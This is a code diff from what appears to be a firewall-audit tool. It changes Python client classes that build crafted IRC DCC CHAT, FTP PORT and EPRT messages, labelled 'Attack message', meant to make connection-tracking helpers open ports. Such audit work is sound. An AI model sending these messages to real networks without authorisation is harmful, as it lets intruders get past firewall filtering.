@@ -38,12 +38,14 @@ class generic_client:
 
     def send_command(self):
         self.conn.sendall(self.message)
+        self.conn.close()
 
     def run(self):
+        self.connect()
+        print str(self.conn)
         self.message = self.build_command()
         if self.verbose:
             print "Attack message:\n%s\n" % self.message
-        self.connect()
         self.send_command()
 
     def build_command(self):
@@ -57,12 +59,12 @@ class irc(generic_client):
             ipn=(ipn<<8)+int(ip.pop(0))
         return ipn
     def build_command(self):
-        ipaddr = socket.gethostbyname(self.ip)
+        (ipaddr, port) = self.conn.getsockname()
         return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(ipaddr), self.port)
 
 class ftp(generic_client):
     def build_command(self):
-        ipaddr = socket.gethostbyname(self.ip)
+        (ipaddr, port) = self.conn.getsockname()
         return 'PORT %s,%d,%d\r\n' % (ipaddr.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
 
 class ftp6(generic_client):
@@ -70,4 +72,5 @@ class ftp6(generic_client):
         ftp.__init__(self, iface, ip, port, verbose)
         self.l3proto = "IPv6"
     def build_command(self):
-        return 'EPRT |2|%s|%d|\r\n' % (self.ip, self.port)
+        (ipaddr, port) = self.conn.getsockname()
+        return 'EPRT |2|%s|%d|\r\n' % (ipaddr, self.port)
